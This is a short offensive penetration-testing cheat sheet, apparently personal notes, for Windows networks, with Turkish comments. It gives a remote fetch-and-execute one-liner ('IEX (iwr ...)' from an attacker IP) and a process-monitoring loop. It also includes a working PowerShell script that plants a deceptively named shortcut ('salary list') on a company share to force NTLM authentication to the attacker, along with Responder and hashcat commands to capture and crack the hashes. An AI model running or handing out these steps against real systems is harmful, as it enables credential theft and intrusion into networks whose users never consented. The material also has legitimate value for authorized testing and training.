# Traffic Capture
```powershell



```

# Process Command Lines
```powershell
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}

Procmon.ps1

IEX (iwr 'http://10.10.10.205/procmon.ps1') 
```

# Poisining Attacks
### [LLMNR-NBTNS-mDNS Poisining](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD-Attacks/LLMNR-NBTNS-mDNS-Poisining.md)


# Capturing Hashes with a Malicious .lnk File
```powershell
sudo responder -I eth0 -dwv

$objShell = New-Object -ComObject WScript.Shell
# Ortak klasörün içinde "Maas_Listesi.lnk" adında bir kısayol tanımlanıyor
$lnk = $objShell.CreateShortcut("\\Sirket-Ortak\Dokumanlar\Maas_Listesi.lnk")
# HEDEF NOKTASI: Windows simgeyi yüklemek için bu adrese gitmeye zorlanacak
$lnk.TargetPath = "\\10.10.10.205\share\icon.png"
# Şüphe çekmemesi için standart bir Windows klasör ikonu atanıyor
$lnk.IconLocation = "%windir%\system32\shell32.dll, 4"
# Değişiklikler kaydediliyor ve dosya diske yazılıyor
$lnk.Save()

hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```
